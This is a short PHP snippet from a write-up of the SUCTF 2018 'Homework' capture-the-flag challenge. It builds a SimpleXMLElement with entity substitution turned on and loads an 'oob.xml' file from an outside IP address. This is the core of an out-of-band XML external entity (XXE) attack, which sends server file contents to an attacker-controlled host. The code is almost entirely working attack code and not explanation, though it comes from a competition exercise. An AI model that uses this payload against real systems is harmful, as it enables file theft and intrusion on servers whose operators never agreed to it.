<?php
//「SUCTF 2018」 Homework
//oob.xml文件的路径
$sxe=new SimpleXMLElement('http://121.40.74.119/oob.xml',2,true);
$a = serialize($sxe);
echo $a;
?>
